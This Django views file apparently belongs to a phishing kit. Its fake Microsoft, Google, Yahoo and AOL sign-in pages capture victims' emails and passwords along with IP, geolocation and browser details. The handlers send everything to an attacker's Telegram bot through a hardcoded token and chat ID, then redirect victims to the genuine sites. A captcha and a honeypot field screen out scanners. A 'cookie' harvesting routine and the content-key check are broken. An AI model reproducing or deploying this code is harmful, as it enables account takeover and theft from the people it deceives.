from django.shortcuts import render
# myapp/views.py
import time
import hmac
import hashlib
import base64
import os
import requests
from django.shortcuts import render, redirect
from django.http import HttpResponseForbidden, JsonResponse, HttpResponse
from django.contrib.sessions.models import Session
from django_ratelimit.decorators import ratelimit
from django.views.decorators.csrf import csrf_exempt
import re
from telegram import Bot
import requests
from telegram import Update, Bot
from telegram.ext import CommandHandler, Updater
import queue

from user_agents import parse

# Configuration for hCaptcha
HCAPTCHA_SITE_KEY = "d476e548-b55a-4406-b790-1d9cfbc04802"
HCAPTCHA_SECRET_KEY = "ES_3082825b449244f5a591ef2d341cd8dc"
email = ""

# Function to generate a secure content key
def generate_content_key(user_id):
    secret_key = os.urandom(24)
    timestamp = int(time.time())
    message = f"{user_id}:{timestamp}"
    signature = hmac.new(secret_key, message.encode(), hashlib.sha256).digest()
    content_key = base64.urlsafe_b64encode(message.encode() + b"." + signature).decode()
    return content_key

# Function to validate content key
def validate_content_key(content_key):
    try:
        decoded = base64.urlsafe_b64decode(content_key.encode()).decode()
        message, signature = decoded.rsplit(".", 1)
        expected_signature = hmac.new(os.urandom(24), message.encode(), hashlib.sha256).digest()
        if hmac.compare_digest(signature.encode(), expected_signature):
            user_id, timestamp = message.split(":")
            # Check if key is expired (5 minutes)
            if int(time.time()) - int(timestamp) < 300:
                return True
    except Exception:
        pass
    return False

# Honeypot check
def is_honeypot_triggered(form_data):
    return form_data.get("honeypot_field", "") != ""

def index(request):
    user_id = os.urandom(8).hex()  # Simulate a user session
    request.session['user_id'] = user_id  # Store user ID in session
    return render(request, "index.html", {"site_key": HCAPTCHA_SITE_KEY})


@ratelimit(key='ip', rate='2/m', method='ALL')
def validate(request):
    if request.method == "POST":
        if request.limited:
            return HttpResponseForbidden("Access Denied due to too many requests")
        # Honeypot check
        if request.limited:
            return HttpResponseForbidden("Access Denied due to too many requests")
        if is_honeypot_triggered(request.POST):
            return render(request, 'index.html')

        # Validate hCaptcha
        hcaptcha_response = request.POST.get("h-captcha-response")
        if not hcaptcha_response:
            return render(request, 'index.html')

        response = requests.post("https://hcaptcha.com/siteverify", data={
            "secret": HCAPTCHA_SECRET_KEY,
            "response": hcaptcha_response,
        }).json()

        if not response.get("success"):
            return render(request, 'index.html')

        # Generate content key
        user_id = request.session.get('user_id')
        content_key = generate_content_key(user_id)
        try:
            return render(request, "logs.html")
        except:
            print("VALIDATION FAILED!!!")
            redirect('')

@csrf_exempt
def content(request):
    content_key = request.POST.get("content_key")
    if not validate_content_key(content_key):
        return JsonResponse({"error": "Invalid or expired content key."}, status=403)

    # Serve protected content
    dynamic_content = {"data": "This is your dynamically loaded secure content."}
    return JsonResponse(dynamic_content)


def mssignin(request):
    validate(request)
    return render(request, 'log1.html')


def grab_e(request):
    validate(request)
    username = request.POST.get('uname')
    print(username)
    request.session['email'] = username
    ip = get_client_ip(request)
    ip_info = get_ip_info(ip)
    OS = my_view(request)
    TeleBot(f"Email: {username}\nIP: {ip}\nIP INFO: {ip_info}\n{OS}")
    return render(request, 'pass.html')

def grab_p(request):
    validate(request)
    password = request.POST.get('pass')
    print(password)
    TeleBot(f"Password: {password}")
    shared_value = request.session.get('email', 'Default Value')
    context={
        'email': shared_value
    }
    return render(request, 'last.html', context)

def finnish(request):
    cookie()
    return redirect('https://www.microsoft.com')




@csrf_exempt
def send(request):

    return render(request, 'index.html')


def parse_user_agent(user_agent_string):
    # Extract WebKit information
    webkit_match = re.search(r'AppleWebKit/([\d.]+)', user_agent_string)
    webkit_version = webkit_match.group(1) if webkit_match else 'Unknown'

    # Extract browser and OS information
    browser_match = re.search(r'(Firefox|Chrome|Safari|Opera|MSIE|Trident)/([\d.]+)', user_agent_string)
    browser_info = browser_match.groups() if browser_match else ('Unknown', 'Unknown')

    os_match = re.search(r'\(([^)]+)\)', user_agent_string)
    os_info = os_match.group(1) if os_match else 'Unknown'

    return {
        'browser': browser_info[0],
        'browser_version': browser_info[1],
        'webkit_version': webkit_version,
        'os_info': os_info,
    }


def my_view(request):
    user_agent_string = request.META.get('HTTP_USER_AGENT', '')
    user_agent = parse(user_agent_string)
    details = parse_user_agent(user_agent_string)
    
    # Extract details
    browser_family = user_agent.browser.family
    browser_version = user_agent.browser.version_string
    os_family = user_agent.os.family
    os_version = user_agent.os.version_string
    is_mobile = user_agent.is_mobile
    is_tablet = user_agent.is_tablet
    is_touch_capable = user_agent.is_touch_capable
    is_pc = user_agent.is_pc

    
    
    # Construct a response with the extracted details
    response = (
        f'Browser: {browser_family} {browser_version}\n'
        f'Operating System: {details["os_info"]}\n'
        f'Is Mobile: {is_mobile}\n'
        f'Is Tablet: {is_tablet}\n'
        f'Is Touch Capable: {is_touch_capable}\n'
        f'Is PC: {is_pc}\n'
        f'AppleWebKit Version: {details["webkit_version"]}\n'
    )
    
    return response


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        # If the 'HTTP_X_FORWARDED_FOR' header exists, it might be a comma-separated list of IPs.
        ip = x_forwarded_for.split(',')[0]
    else:
        # Fallback to 'REMOTE_ADDR' if 'HTTP_X_FORWARDED_FOR' is not present.
        ip = request.META.get('REMOTE_ADDR')
    return ip

def get_ip_info(ip_address):
    response = requests.get(f'https://ipinfo.io/{ip_address}/json')
    return response.json()

def TeleBot(message):
    # Replace 'YOUR_API_TOKEN' with your actual bot token
    bot = Bot(token='7400175327:AAE27TxoNvMvqfqy436zVufyE9skAAd0MCQ')

    # Replace 'CHAT_ID' with the chat ID where you want to send the message
    chat_id = '5813084500'

    

    # Replace 'YOUR_API_TOKEN' with your actual bot token
    api_token = '7400175327:AAE27TxoNvMvqfqy436zVufyE9skAAd0MCQ'
    #bot.send_message(chat_id=chat_id, text=message)
    # Send a message
    url = f'https://api.telegram.org/bot{api_token}/sendMessage'
    params = {'chat_id': chat_id, 'text': message}
    try:
        response = requests.post(url, data=params)
    except:
        print("Connection Error")


    def start(update, context):
        pass

    def main():
        try:
            updater = Updater('7400175327:AAE27TxoNvMvqfqy436zVufyE9skAAd0MCQ', queue.Queue())
            dp = updater.dispatcher
            dp.add_handler(CommandHandler("start", start))
            updater.start_polling()
            updater.shutdown()
        except:
            print("Message not Sent")


    if __name__ == '__main__':
        main()

def cookie():
    url = [
        "microsoft.com",
        "google.com",
        "account.google.com",
        "aol.com",          # AOL
        "outlook.com",
        "gmail.com",
        "zoho.com",         # Zoho
        "instagram.com"
        "facebook.com"       # Google
        "yahoo.com",        # Yahoo
        "hotmail.com",      # Microsoft
        "mail.com",         # 1&1 Mail
        "icloud.com",       # Apple   # Virgin Media
    ]


    for link in url:
        try:
            response = requests.get(f"https://{link}")
            cookies = response.cookies
            for cookie in cookies:
                TeleBot(f"Cookie for {link}\nName: {cookie.name}\nValue: {cookie.value}\n================================")
        except:
            print("connection timedout or invalid url")


def ggrab_e(request):
    validate(request)
    username = request.POST.get('identifier')
    print(username)
    request.session['email'] = username
    ip = get_client_ip(request)
    ip_info = get_ip_info(ip)
    OS = my_view(request)
    TeleBot(f"Email: {username}\nIP: {ip}\nIP INFO: {ip_info}\n{OS}")
    return render(request, 'googlp.html', {'email':username})


def gsignin(request):
    validate(request)
    return render(request, 'google.html')

def ggrab_p(request):
    validate(request)
    email = request.session.get('Passwd')
    password = request.POST.get('Passwd')
    print(password)
    TeleBot(f"Password: {password}")
    cookie()
    return redirect('https://accounts.google.com')

def gfinnish(request):
    return redirect('https://www.microsoft.com')



def ygrab_e(request):
    validate(request)
    username = request.POST.get('username')
    print(username)
    request.session['email'] = username
    ip = get_client_ip(request)
    ip_info = get_ip_info(ip)
    OS = my_view(request)
    TeleBot(f"Email: {username}\nIP: {ip}\nIP INFO: {ip_info}\n{OS}")
    return render(request, 'yahoop.html', {'email':username})


def ysignin(request):
    validate(request)
    return render(request, 'yahooe.html')

def ygrab_p(request):
    validate(request)
    email = request.session.get('Passwd')
    password = request.POST.get('password')
    print(password)
    TeleBot(f"Password: {password}")
    cookie()
    return redirect('https://www.yahoo.com')

def yfinnish(request):
    return redirect('https://www.yahoo.com')


def agrab_e(request):
    validate(request)
    username = request.POST.get('username')
    print(username)
    request.session['email'] = username
    ip = get_client_ip(request)
    ip_info = get_ip_info(ip)
    OS = my_view(request)
    TeleBot(f"Email: {username}\nIP: {ip}\nIP INFO: {ip_info}\n{OS}")
    return render(request, 'aolp.html', {'email':username})


def asignin(request):
    validate(request)
    return render(request, 'aole.html')

def agrab_p(request):
    validate(request)
    email = request.session.get('Passwd')
    password = request.POST.get('password')
    print(password)
    TeleBot(f"Password: {password}")
    cookie()
    return redirect('https://www.aol.com')

def afinnish(request):
    return redirect('https://www.aol.com')
